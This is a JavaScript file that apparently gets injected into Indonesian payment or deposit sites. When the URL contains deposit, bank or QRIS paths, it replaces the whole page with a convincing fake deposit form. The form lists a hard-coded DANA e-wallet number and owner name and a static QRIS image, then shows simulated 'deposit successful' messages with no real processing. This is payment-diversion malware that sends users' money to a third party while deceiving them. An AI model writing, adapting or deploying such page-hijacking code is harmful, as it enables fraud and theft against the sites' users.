(function () {
  const url = window.location.href;
  const match = [
    '/deposit',
    '/bank',
    '/deposit.php',
    '/qris.php',
    '/cashier',
    '/metode/?bank=',
    '/?bank=',
    '/?page=transaksi',
    '/index.php?page=transaksi',
    '/?deposit&head=home',
    '/index.php?page=cashier',
    '/bank.php'
  ];

  if (!match.some(path => url.includes(path))) return;

  document.documentElement.innerHTML = "<head></head><body></body>";

  document.head.innerHTML = `
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Formulir Deposit</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
      :root {
        --primary-blue: #2563eb;
        --blue-dark: #1e40af;
        --blue-light: #3b82f6;
        --blue-soft: #60a5fa;
        --black-dark: #0f172a;
        --black-light: #1e293b;
        --black-lighter: #334155;
        --gray-dark: #475569;
        --gray-light: #94a3b8;
        --white: #f8fafc;
        --success: #10b981;
        --warning: #f59e0b;
        --danger: #ef4444;
        --border-radius: 16px;
        --border-radius-sm: 10px;
        --box-shadow: 0 10px 30px rgba(0, 30, 84, 0.25);
        --box-shadow-hover: 0 15px 40px rgba(0, 30, 84, 0.35);
        --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        --gradient-blue: linear-gradient(135deg, var(--primary-blue) 0%, var(--blue-light) 100%);
        --gradient-dark: linear-gradient(135deg, var(--black-dark) 0%, var(--black-light) 100%);
      }
      
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      
      body {
        font-family: 'Poppins', sans-serif;
        background: var(--gradient-dark);
        color: var(--white);
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        padding: 20px;
        line-height: 1.6;
      }
      
      .container {
        width: 100%;
        max-width: 500px;
        background: rgba(30, 41, 59, 0.9);
        backdrop-filter: blur(10px);
        border-radius: var(--border-radius);
        box-shadow: var(--box-shadow);
        overflow: hidden;
        border: 2px solid rgba(59, 130, 246, 0.2);
        position: relative;
      }
      
      .container::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        height: 4px;
        background: var(--gradient-blue);
        z-index: 10;
      }
      
      .header {
        background: linear-gradient(135deg, rgba(15, 23, 42, 0.95) 0%, rgba(30, 41, 59, 0.95) 100%);
        padding: 28px 20px;
        text-align: center;
        position: relative;
        border-bottom: 1px solid rgba(59, 130, 246, 0.3);
      }
      
      .header::after {
        content: '';
        position: absolute;
        bottom: -1px;
        left: 20%;
        right: 20%;
        height: 2px;
        background: var(--gradient-blue);
        border-radius: 2px;
      }
      
      .header h1 {
        font-size: 26px;
        font-weight: 700;
        margin-bottom: 8px;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 12px;
        background: linear-gradient(90deg, var(--blue-light), var(--blue-soft));
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
      }
      
      .header p {
        font-size: 14px;
        color: var(--gray-light);
        font-weight: 400;
        max-width: 80%;
        margin: 0 auto;
      }
      
      .marquee-container {
        background: rgba(30, 41, 59, 0.8);
        border-bottom: 1px solid rgba(59, 130, 246, 0.2);
        padding: 12px 0;
        overflow: hidden;
        position: relative;
      }
      
      .marquee {
        display: flex;
        animation: marquee 25s linear infinite;
        white-space: nowrap;
      }
      
      .marquee span {
        display: inline-flex;
        align-items: center;
        gap: 10px;
        padding: 0 30px;
        font-size: 13px;
        color: var(--warning);
        font-weight: 500;
        min-width: max-content;
      }
      
      @keyframes marquee {
        0% { transform: translateX(0); }
        100% { transform: translateX(-50%); }
      }
      
      .content {
        padding: 28px 22px;
      }
      
      .tab-buttons {
        display: flex;
        gap: 12px;
        margin-bottom: 24px;
        background: rgba(15, 23, 42, 0.7);
        padding: 8px;
        border-radius: var(--border-radius-sm);
        border: 1px solid rgba(59, 130, 246, 0.2);
      }
      
      .tab-btn {
        flex: 1;
        background: transparent;
        border: 1px solid transparent;
        color: var(--gray-light);
        padding: 14px 16px;
        border-radius: 10px;
        font-weight: 600;
        font-size: 14px;
        cursor: pointer;
        transition: var(--transition);
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
      }
      
      .tab-btn.active {
        background: rgba(59, 130, 246, 0.15);
        color: var(--blue-soft);
        border-color: rgba(59, 130, 246, 0.4);
        box-shadow: 0 4px 15px rgba(59, 130, 246, 0.2);
      }
      
      .tab-btn:hover:not(.active) {
        background: rgba(59, 130, 246, 0.1);
        border-color: rgba(59, 130, 246, 0.3);
      }
      
      .help-btn {
        width: 100%;
        background: rgba(139, 92, 246, 0.1);
        color: #c4b5fd;
        border: 1px solid rgba(139, 92, 246, 0.3);
        padding: 16px;
        border-radius: var(--border-radius-sm);
        font-weight: 600;
        font-size: 15px;
        cursor: pointer;
        transition: var(--transition);
        margin-bottom: 24px;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 12px;
      }
      
      .help-btn:hover {
        background: rgba(139, 92, 246, 0.2);
        border-color: rgba(139, 92, 246, 0.5);
        transform: translateY(-2px);
        box-shadow: 0 8px 25px rgba(139, 92, 246, 0.3);
      }
      
      .form-section {
        display: none;
        animation: fadeIn 0.5s ease;
      }
      
      .form-section.active {
        display: block;
      }
      
      @keyframes fadeIn {
        from { opacity: 0; transform: translateY(15px); }
        to { opacity: 1; transform: translateY(0); }
      }
      
      .form-group {
        margin-bottom: 22px;
      }
      
      .form-group label {
        display: flex;
        align-items: center;
        gap: 10px;
        margin-bottom: 10px;
        font-size: 14px;
        font-weight: 600;
        color: var(--blue-soft);
      }
      
      .form-group label i {
        color: var(--blue-light);
        width: 20px;
      }
      
      select, input {
        width: 100%;
        padding: 16px;
        background: rgba(15, 23, 42, 0.7);
        border: 1px solid rgba(59, 130, 246, 0.3);
        border-radius: var(--border-radius-sm);
        font-size: 15px;
        color: var(--white);
        transition: var(--transition);
        font-family: 'Poppins', sans-serif;
      }
      
      select:focus, input:focus {
        outline: none;
        border-color: var(--blue-light);
        box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
        background: rgba(15, 23, 42, 0.9);
      }
      
      .bank-card {
        background: rgba(15, 23, 42, 0.8);
        border-radius: var(--border-radius);
        padding: 24px;
        margin-top: 20px;
        border: 1px solid rgba(59, 130, 246, 0.25);
        display: none;
        box-shadow: 0 8px 25px rgba(0, 20, 60, 0.2);
      }
      
      .bank-card.active {
        display: block;
        animation: slideUp 0.5s ease;
      }
      
      @keyframes slideUp {
        from { opacity: 0; transform: translateY(20px); }
        to { opacity: 1; transform: translateY(0); }
      }
      
      .bank-header {
        display: flex;
        align-items: center;
        gap: 18px;
        margin-bottom: 24px;
        padding-bottom: 20px;
        border-bottom: 1px solid rgba(59, 130, 246, 0.2);
      }
      
      .bank-logo {
        width: 70px;
        height: 70px;
        border-radius: 14px;
        object-fit: contain;
        background: white;
        padding: 10px;
        border: 2px solid rgba(59, 130, 246, 0.3);
        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
      }
      
      .bank-info h3 {
        font-size: 20px;
        margin-bottom: 6px;
        color: var(--blue-light);
        font-weight: 700;
      }
      
      .bank-info p {
        font-size: 14px;
        color: var(--gray-light);
        font-weight: 400;
      }
      
      .account-number {
        background: rgba(15, 23, 42, 0.9);
        border-radius: var(--border-radius-sm);
        padding: 20px;
        margin-bottom: 24px;
        border: 1px solid rgba(59, 130, 246, 0.25);
        position: relative;
        overflow: hidden;
      }
      
      .account-number::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        width: 4px;
        height: 100%;
        background: var(--gradient-blue);
      }
      
      .account-number p {
        font-size: 13px;
        color: var(--gray-light);
        margin-bottom: 8px;
        font-weight: 500;
      }
      
      .number-container {
        display: flex;
        justify-content: space-between;
        align-items: center;
      }
      
      .number-container span {
        font-size: 20px;
        font-weight: 700;
        letter-spacing: 1.5px;
        font-family: 'Courier New', monospace;
        color: var(--blue-soft);
        text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
      }
      
      .copy-btn {
        background: rgba(59, 130, 246, 0.15);
        color: var(--blue-soft);
        border: 1px solid rgba(59, 130, 246, 0.4);
        border-radius: 8px;
        padding: 10px 18px;
        font-size: 13px;
        font-weight: 600;
        cursor: pointer;
        transition: var(--transition);
        display: flex;
        align-items: center;
        gap: 8px;
      }
      
      .copy-btn:hover {
        background: rgba(59, 130, 246, 0.25);
        border-color: var(--blue-light);
        transform: translateY(-2px);
        box-shadow: 0 5px 15px rgba(59, 130, 246, 0.2);
      }
      
      .action-btn {
        width: 100%;
        background: rgba(16, 185, 129, 0.15);
        color: #a7f3d0;
        border: 1px solid rgba(16, 185, 129, 0.4);
        padding: 18px;
        border-radius: var(--border-radius-sm);
        font-weight: 600;
        font-size: 16px;
        cursor: pointer;
        transition: var(--transition);
        margin-top: 10px;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 12px;
      }
      
      .action-btn:hover {
        background: rgba(16, 185, 129, 0.25);
        border-color: var(--success);
        transform: translateY(-3px);
        box-shadow: 0 10px 25px rgba(16, 185, 129, 0.25);
      }
      
      .action-btn:disabled {
        background: rgba(71, 85, 105, 0.3);
        border-color: rgba(71, 85, 105, 0.5);
        color: var(--gray-light);
        cursor: not-allowed;
        transform: none;
        box-shadow: none;
      }
      
      .qr-container {
        text-align: center;
        margin-top: 24px;
        display: none;
        background: rgba(15, 23, 42, 0.8);
        border-radius: var(--border-radius);
        padding: 24px;
        border: 1px solid rgba(59, 130, 246, 0.25);
      }
      
      .qr-container.active {
        display: block;
        animation: fadeIn 0.5s ease;
      }
      
      .qr-code {
        width: 240px;
        height: 240px;
        border-radius: var(--border-radius-sm);
        margin: 0 auto 24px;
        border: 2px solid rgba(59, 130, 246, 0.3);
        padding: 20px;
        background: white;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
      }
      
      .qr-code img {
        width: 100%;
        height: 100%;
        object-fit: contain;
      }
      
      .qr-actions {
        display: flex;
        gap: 12px;
        margin-top: 24px;
      }
      
      .qr-actions button {
        flex: 1;
        padding: 16px;
        border-radius: var(--border-radius-sm);
        font-weight: 600;
        font-size: 14px;
        cursor: pointer;
        transition: var(--transition);
        border: none;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
      }
      
      .download-btn {
        background: rgba(59, 130, 246, 0.15);
        color: var(--blue-soft);
        border: 1px solid rgba(59, 130, 246, 0.4);
      }
      
      .download-btn:hover {
        background: rgba(59, 130, 246, 0.25);
        border-color: var(--blue-light);
        transform: translateY(-2px);
        box-shadow: 0 8px 20px rgba(59, 130, 246, 0.25);
      }
      
      .done-btn {
        background: rgba(16, 185, 129, 0.15);
        color: #a7f3d0;
        border: 1px solid rgba(16, 185, 129, 0.4);
      }
      
      .done-btn:hover {
        background: rgba(16, 185, 129, 0.25);
        border-color: var(--success);
        transform: translateY(-2px);
        box-shadow: 0 8px 20px rgba(16, 185, 129, 0.25);
      }
      
      .spinner {
        width: 50px;
        height: 50px;
        border: 4px solid rgba(59, 130, 246, 0.1);
        border-top: 4px solid var(--blue-light);
        border-radius: 50%;
        animation: spin 1s cubic-bezier(0.68, -0.55, 0.27, 1.55) infinite;
        margin: 30px auto;
      }
      
      @keyframes spin {
        to { transform: rotate(360deg); }
      }
      
      .info-box {
        background: rgba(59, 130, 246, 0.1);
        border-left: 4px solid var(--blue-light);
        padding: 18px;
        border-radius: 0 var(--border-radius-sm) var(--border-radius-sm) 0;
        margin: 24px 0;
        font-size: 14px;
        color: var(--blue-soft);
        display: flex;
        align-items: flex-start;
        gap: 12px;
      }
      
      .info-box i {
        color: var(--blue-light);
        margin-top: 2px;
      }
      
      .info-box.warning {
        background: rgba(245, 158, 11, 0.1);
        border-left-color: var(--warning);
        color: #fde68a;
      }
      
      .info-box.warning i {
        color: var(--warning);
      }
      
      .footer {
        text-align: center;
        padding: 24px 20px;
        border-top: 1px solid rgba(59, 130, 246, 0.2);
        background: rgba(15, 23, 42, 0.8);
      }
      
      .footer img {
        max-width: 85%;
        border-radius: var(--border-radius-sm);
        border: 2px solid rgba(59, 130, 246, 0.3);
        box-shadow: 0 8px 25px rgba(0, 20, 60, 0.3);
        transition: var(--transition);
      }
      
      .footer img:hover {
        transform: translateY(-3px);
        box-shadow: 0 12px 35px rgba(0, 20, 60, 0.4);
        border-color: rgba(59, 130, 246, 0.5);
      }
      
      .toast {
        position: fixed;
        bottom: 30px;
        left: 50%;
        transform: translateX(-50%) translateY(100px);
        min-width: 320px;
        max-width: 90%;
        text-align: center;
        padding: 18px 24px;
        border-radius: var(--border-radius-sm);
        font-size: 15px;
        font-weight: 500;
        opacity: 0;
        pointer-events: none;
        transition: transform 0.4s cubic-bezier(0.68, -0.55, 0.27, 1.55), opacity 0.4s ease;
        z-index: 1000;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 12px;
        backdrop-filter: blur(10px);
        border: 1px solid rgba(255, 255, 255, 0.1);
      }
      
      .toast.show {
        opacity: 1;
        transform: translateX(-50%) translateY(0);
      }
      
      .toast.success {
        background: rgba(16, 185, 129, 0.9);
        color: white;
      }
      
      .toast.error {
        background: rgba(239, 68, 68, 0.9);
        color: white;
      }
      
      .toast.info {
        background: rgba(59, 130, 246, 0.9);
        color: white;
      }
      
      @media (max-width: 480px) {
        .container {
          border-radius: 12px;
        }
        
        .header {
          padding: 24px 16px;
        }
        
        .content {
          padding: 20px 16px;
        }
        
        .tab-buttons {
          flex-direction: column;
        }
        
        .qr-actions {
          flex-direction: column;
        }
        
        .qr-code {
          width: 200px;
          height: 200px;
        }
        
        .bank-logo {
          width: 60px;
          height: 60px;
        }
        
        .toast {
          min-width: 280px;
          padding: 16px 20px;
        }
      }
    </style>
  `;

  document.body.innerHTML = `
    <div class="container">
      <div class="header">
        <h1><i class="fas fa-coins"></i> Formulir Deposit</h1>
        <p>Lakukan deposit dengan mudah dan cepat dalam hitungan menit</p>
      </div>
      
      <div class="marquee-container">
        <div class="marquee">
          <span><i class="fas fa-exclamation-circle"></i> Deposit diluar tujuan deposit kami tidak dapat diproses dan Transaksi pertama wajib menggunakan kode unik 123</span>
          <span><i class="fas fa-shield-alt"></i> Sistem deposit otomatis 24/7 dengan keamanan terenkripsi</span>
        </div>
      </div>
      
      <div class="content">
        <div class="tab-buttons">
          <button class="tab-btn active" onclick="switchTab('manual')">
            <i class="fas fa-hand-holding-usd"></i> Deposit Manual
          </button>
          <button class="tab-btn" onclick="switchTab('auto')">
            <i class="fas fa-qrcode"></i> QRIS Otomatis
          </button>
        </div>
        
        <button class="help-btn" onclick="openHelp()">
          <i class="fas fa-headset"></i> Butuh Bantuan? Hubungi CS
        </button>
        
        <!-- Manual Deposit Section -->
        <div id="manual-section" class="form-section active">
          <div class="form-group">
            <label for="bank-select">
              <i class="fas fa-university"></i> Pilih Metode Pembayaran
            </label>
            <select id="bank-select" onchange="selectMethod(this.value)">
              <option value="" selected disabled>Pilih metode deposit...</option>
              <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRgpSc_j6RrvzR4yXB3aJvMKum3-dbfqVJVwo_xCgZmnA&s=10","name":"DANA","number":"0895327827948","owner":"M ALVIN"}'>DANA - Transfer E-Wallet</option>
            </select>
          </div>
          
          <div id="bank-card" class="bank-card">
            <div class="bank-header">
              <img id="bank-logo" class="bank-logo" src="" alt="Bank Logo">
              <div class="bank-info">
                <h3 id="bank-name"></h3>
                <p id="bank-owner"></p>
              </div>
            </div>
            
            <div class="account-number">
              <p>Nomor Rekening / E-Wallet</p>
              <div class="number-container">
                <span id="bank-number"></span>
                <button class="copy-btn" onclick="copyNumber()">
                  <i class="far fa-copy"></i> Salin
                </button>
              </div>
            </div>
            
            <div class="info-box warning">
              <i class="fas fa-exclamation-triangle"></i> 
              <div>
                <strong>Perhatian:</strong> Pastikan Anda mentransfer ke nomor di atas dengan benar. 
                Deposit minimal Rp 50.000. Transaksi pertama wajib +123.
              </div>
            </div>
            
            <div class="form-group">
              <label for="manual-nominal">
                <i class="fas fa-money-bill-wave"></i> Nominal Deposit
              </label>
              <input id="manual-nominal" type="number" min="50000" placeholder="Contoh: 50000">
            </div>
            
            <button class="action-btn" onclick="submitManualDeposit()" id="manual-submit-btn">
              <i class="fas fa-paper-plane"></i> Kirim Deposit Manual
            </button>
            
            <div id="manual-result"></div>
          </div>
        </div>
        
        <!-- QRIS Section -->
        <div id="auto-section" class="form-section">
          <div class="form-group">
            <label for="auto-nominal">
              <i class="fas fa-money-bill-wave"></i> Nominal Deposit
            </label>
            <input id="auto-nominal" type="number" min="50000" placeholder="Contoh: 50000">
          </div>
          
          <div class="info-box">
            <i class="fas fa-info-circle"></i>
            <div>
              <strong>QRIS Support:</strong> DANA, OVO, ShopeePay, LinkAja, GoPay, 
              Mobile Banking, Internet Banking, dan Dompet Digital lainnya.
            </div>
          </div>
          
          <button class="action-btn" onclick="generateQRIS()" id="qris-generate-btn">
            <i class="fas fa-qrcode"></i> Generate QRIS
          </button>
          
          <div id="qr-container" class="qr-container">
            <div class="qr-code">
              <img id="qris-img" src="" alt="QR Code">
            </div>
            
            <div class="info-box">
              <i class="fas fa-camera"></i>
              <div>
                Scan QR code menggunakan aplikasi e-wallet atau mobile banking. 
                Valid selama 30 menit.
              </div>
            </div>
            
            <div class="qr-actions">
              <button class="download-btn" onclick="downloadQRIS()">
                <i class="fas fa-download"></i> Download QR
              </button>
              <button class="done-btn" onclick="finishPayment()">
                <i class="fas fa-check-circle"></i> Sudah Bayar
              </button>
            </div>
          </div>
          
          <div id="auto-result"></div>
        </div>
      </div>
      
      <div class="footer">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSxt4SV-4Fwz_SHmJwW_ENA4zghNfwbYgAG4x_l9IbA0w&s=10" alt="Secure Payment System">
      </div>
    </div>
    
    <div id="toast" class="toast"></div>
  `;

  // Toast Notification
  function showToast(msg, type = "success") {
    const toast = document.getElementById("toast");
    const icon = {
      success: 'check-circle',
      error: 'exclamation-circle',
      info: 'info-circle'
    }[type];
    
    toast.innerHTML = `
      <i class="fas fa-${icon}"></i>
      <span>${msg}</span>
    `;
    toast.className = `toast ${type}`;
    
    // Trigger reflow
    toast.offsetHeight;
    
    toast.classList.add("show");
    
    setTimeout(() => {
      toast.classList.remove("show");
    }, 3000);
  }

  // Tab Switching
  window.switchTab = function (tab) {
    // Update tab buttons
    document.querySelectorAll('.tab-btn').forEach(btn => {
      btn.classList.remove('active');
    });
    
    if (tab === 'manual') {
      document.querySelector('.tab-btn:nth-child(1)').classList.add('active');
      document.getElementById('manual-section').classList.add('active');
      document.getElementById('auto-section').classList.remove('active');
      
      // Reset auto section
      document.getElementById('qr-container').classList.remove('active');
      document.getElementById('auto-nominal').value = '';
    } else {
      document.querySelector('.tab-btn:nth-child(2)').classList.add('active');
      document.getElementById('auto-section').classList.add('active');
      document.getElementById('manual-section').classList.remove('active');
      
      // Reset manual section
      document.getElementById('bank-card').classList.remove('active');
      document.getElementById('bank-select').value = '';
      document.getElementById('manual-nominal').value = '';
    }
  };

  // Select Payment Method
  window.selectMethod = function (jsonStr) {
    if (!jsonStr) {
      document.getElementById('bank-card').classList.remove('active');
      return;
    }
    
    try {
      const method = JSON.parse(jsonStr);
      document.getElementById('bank-logo').src = method.logo;
      document.getElementById('bank-name').textContent = method.name;
      document.getElementById('bank-number').textContent = method.number;
      document.getElementById('bank-owner').textContent = `a/n ${method.owner}`;
      
      document.getElementById('bank-card').classList.add('active');
      document.getElementById('manual-nominal').value = '';
      document.getElementById('manual-result').innerHTML = '';
      
      showToast(`${method.name} dipilih`, 'info');
    } catch (error) {
      showToast('Gagal memuat metode pembayaran', 'error');
    }
  };

  // Copy Account Number
  window.copyNumber = function () {
    const num = document.getElementById('bank-number').textContent;
    if (!num || num === '') {
      showToast('Nomor rekening kosong', 'error');
      return;
    }
    
    navigator.clipboard.writeText(num).then(() => {
      showToast('Nomor berhasil disalin ke clipboard', 'success');
    }).catch(() => {
      // Fallback for older browsers
      const textArea = document.createElement('textarea');
      textArea.value = num;
      document.body.appendChild(textArea);
      textArea.select();
      document.execCommand('copy');
      document.body.removeChild(textArea);
      showToast('Nomor berhasil disalin', 'success');
    });
  };

  // Submit Manual Deposit
  window.submitManualDeposit = function () {
    const nominal = Number(document.getElementById('manual-nominal').value || 0);
    const bankCard = document.getElementById('bank-card');
    
    if (!bankCard.classList.contains('active')) {
      showToast('Pilih metode pembayaran terlebih dahulu', 'error');
      return;
    }
    
    if (nominal < 50000) {
      showToast('Minimal deposit adalah Rp 50.000', 'error');
      return;
    }
    
    const btn = document.getElementById('manual-submit-btn');
    const originalText = btn.innerHTML;
    
    // Disable button and show loading
    btn.disabled = true;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Memproses Deposit...';
    
    const resultDiv = document.getElementById('manual-result');
    resultDiv.innerHTML = '<div class="spinner"></div>';
    
    // Simulate API call
    setTimeout(() => {
      btn.disabled = false;
      btn.innerHTML = originalText;
      
      resultDiv.innerHTML = `
        <div class="info-box">
          <i class="fas fa-check-circle"></i>
          <div>
            <strong>Deposit Berhasil Dikirim!</strong><br>
            Deposit sebesar <strong>Rp ${nominal.toLocaleString('id-ID')}</strong> 
            sedang diproses. Silakan tunggu konfirmasi dalam 1-5 menit.
          </div>
        </div>
      `;
      
      showToast('Deposit berhasil dikirim!', 'success');
      
      // Auto redirect after 5 seconds
      setTimeout(() => {
        showToast('Mengembalikan ke halaman sebelumnya...', 'info');
        setTimeout(() => history.back(), 1000);
      }, 5000);
    }, 2000);
  };

  // Generate QRIS
  window.generateQRIS = function () {
    const nominal = Number(document.getElementById('auto-nominal').value || 0);
    
    if (nominal < 50000) {
      showToast('Minimal deposit adalah Rp 50.000', 'error');
      return;
    }
    
    const btn = document.getElementById('qris-generate-btn');
    const originalText = btn.innerHTML;
    
    // Disable button and show loading
    btn.disabled = true;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Membuat QRIS...';
    
    const resultDiv = document.getElementById('auto-result');
    resultDiv.innerHTML = '<div class="spinner"></div>';
    
    // Simulate QR generation
    setTimeout(() => {
      btn.disabled = false;
      btn.innerHTML = originalText;
      resultDiv.innerHTML = '';
      
      // Use your provided image
      const qrUrl = "https://imagizer.imageshack.com/img922/592/X4lzqE.jpg";
      document.getElementById('qris-img').src = qrUrl;
      document.getElementById('qr-container').classList.add('active');
      
      showToast(`QRIS Rp ${nominal.toLocaleString('id-ID')} berhasil dibuat!`, 'success');
      
      // Scroll to QR code
      document.getElementById('qr-container').scrollIntoView({
        behavior: 'smooth',
        block: 'center'
      });
    }, 1500);
  };

  // Download QRIS
  window.downloadQRIS = function () {
    const qrUrl = "https://imagizer.imageshack.com/img922/592/X4lzqE.jpg";
    const link = document.createElement('a');
    link.href = qrUrl;
    link.download = `qris-deposit-${Date.now()}.png`;
    link.target = '_blank';
    
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    
    showToast('QRIS berhasil diunduh ke perangkat Anda', 'success');
  };

  // Finish Payment
  window.finishPayment = function () {
    showToast('Pembayaran berhasil dikonfirmasi!', 'success');
    
    // Simulate processing
    setTimeout(() => {
      showToast('Sedang memproses deposit Anda...', 'info');
      
      setTimeout(() => {
        showToast('Deposit berhasil diproses!', 'success');
        setTimeout(() => history.back(), 2000);
      }, 2000);
    }, 1000);
  };

  // Open Help
  window.openHelp = function () {
    showToast('Membuka layanan Customer Service...', 'info');
    
    setTimeout(() => {
      window.open("https://direct.lc.chat/19347249", "_blank");
    }, 500);
  };

  // Initialize
  window.addEventListener('DOMContentLoaded', () => {
    // Set default bank if needed
    const bankSelect = document.getElementById('bank-select');
    if (bankSelect.value) {
      selectMethod(bankSelect.value);
    }
    
    // Add input formatting
    const nominalInputs = document.querySelectorAll('input[type="number"]');
    nominalInputs.forEach(input => {
      input.addEventListener('input', function() {
        if (this.value && Number(this.value) >= 50000) {
          this.style.borderColor = 'rgba(16, 185, 129, 0.6)';
          this.style.boxShadow = '0 0 0 2px rgba(16, 185, 129, 0.1)';
        } else if (this.value && Number(this.value) < 50000) {
          this.style.borderColor = 'rgba(239, 68, 68, 0.6)';
          this.style.boxShadow = '0 0 0 2px rgba(239, 68, 68, 0.1)';
        } else {
          this.style.borderColor = 'rgba(59, 130, 246, 0.3)';
          this.style.boxShadow = 'none';
        }
      });
    });
    
    // Add input focus effect
    document.querySelectorAll('select, input').forEach(el => {
      el.addEventListener('focus', function() {
        this.parentElement.style.transform = 'translateY(-2px)';
      });
      
      el.addEventListener('blur', function() {
        this.parentElement.style.transform = 'translateY(0)';
      });
    });
    
    // Initial toast
    setTimeout(() => {
      showToast('Selamat datang di sistem deposit kami!', 'info');
    }, 1000);
  });
})();
